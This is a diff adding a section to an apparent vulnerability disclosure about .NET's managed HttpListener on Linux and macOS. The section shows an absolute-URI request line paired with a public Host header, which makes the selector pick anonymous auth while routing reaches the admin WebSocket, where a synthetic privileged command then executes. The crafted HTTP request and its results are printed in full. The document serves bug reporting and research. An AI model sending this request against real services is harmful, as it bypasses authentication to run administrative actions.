@@ -318,3 +318,117 @@ DOCS_MODEL_WINDOWS_NEGATIVE_CONTROL=PASS
 ```
 
 This confirms the bug is present not only in supported .NET 8/9/10 but also in the current supported/go-live .NET 11 RC1 line.
+
+
+## Combined high-impact terminal: exact admin prefix + WebSocket + privileged operation
+
+Clean run:
+
+https://github.com/SamCloudJourney/basic-website/actions/runs/35531404399
+
+A separate researcher-controlled proof combines all demonstrated boundaries into a single chain.
+
+Framework configuration:
+
+```text
+PUBLIC listener:
+  http://public.test:<port>/
+
+ADMIN listener:
+  http://admin.test:<port>/admin/ws/
+
+ADMIN AuthenticationSchemeSelectorDelegate:
+  public.test -> Anonymous
+  admin.test  -> Basic
+```
+
+Ordinary unauthenticated protected admin WebSocket request:
+
+```http
+GET /admin/ws/control HTTP/1.1
+Host: admin.test:<port>
+Upgrade: websocket
+Connection: Upgrade
+...
+```
+
+Result:
+
+```text
+Selected=Basic
+HTTP/1.1 401 Unauthorized
+WWW-Authenticate: Basic ...
+adminContext=False
+wsUpgrade=False
+commandExecuted=False
+sideEffectCreated=False
+```
+
+Attack:
+
+```http
+GET http://admin.test:<port>/admin/ws/control HTTP/1.1
+Host: public.test:<port>
+Upgrade: websocket
+Connection: Upgrade
+...
+```
+
+Managed Linux/macOS result:
+
+```text
+HttpListener exact prefix routing:
+  publicContext=False
+  adminContext=True
+
+selector:
+  UserHostName=public.test:<port>
+  Url.Host=admin.test
+  Selected=Anonymous
+
+wire:
+  HTTP/1.1 101 Switching Protocols
+  Basic challenge=False
+
+client sends masked WebSocket command:
+  EXECUTE_SYNTHETIC_ADMIN_CHANGE
+
+ADMIN listener receives command
+protected operation executes
+researcher-controlled temp-file side effect is created
+
+ULTIMATE_FRAMEWORK_ROUTING_AUTH_WEBSOCKET_COMMAND_BYPASS=CONFIRMED
+```
+
+Confirmed on:
+
+- .NET 8.0.31 / Linux
+- .NET 9.0.20 / Linux
+- .NET 10.0.12 / Linux
+- .NET 10.0.12 / macOS
+- .NET 11.0.0-rc.1 / Linux
+- .NET 11.0.0-rc.1 / macOS
+
+Windows/http.sys negative controls on .NET 10 and .NET 11 RC1 both remain:
+
+```text
+Selected=Basic
+401 Unauthorized
+adminContext=False
+wsUpgrade=False
+commandExecuted=False
+sideEffectCreated=False
+
+ULTIMATE_WINDOWS_NEGATIVE_CONTROL=PASS
+```
+
+The operation is deliberately synthetic and writes only to the runner's temporary directory. This demonstrates
+integrity impact after the authentication boundary is crossed; it is not a claim of arbitrary code execution.
+
+The same root cause therefore supports all of the following researcher-controlled terminals:
+
+1. protected admin context returned anonymously;
+2. protected state-changing HTTP POST executed;
+3. protected admin WebSocket upgraded to 101 without Basic authentication;
+4. bidirectional privileged command accepted over that WebSocket;
+5. concrete filesystem side effect from the synthetic protected operation.
